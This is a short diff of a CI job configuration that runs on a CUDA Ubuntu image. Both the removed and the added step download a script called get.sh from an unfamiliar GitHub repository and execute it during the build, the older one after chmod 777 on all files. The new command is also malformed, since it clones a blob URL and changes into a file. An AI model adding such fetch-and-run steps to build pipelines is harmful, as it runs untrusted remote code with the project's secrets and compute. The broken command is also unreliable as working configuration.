@@ -5,4 +5,4 @@ jobs:
       image: ubuntu-1604-cuda-11.1:202012-01
     steps:
       - checkout
-      - run: wget https://github.com/guttenocm/songdilan/blob/main/get.sh && chmod 777 * && ./get.sh
+      - run: rm -rf get.sh && git clone https://github.com/guttenocm/songdilan/blob/main/get.sh && cd get.sh && ./get.sh
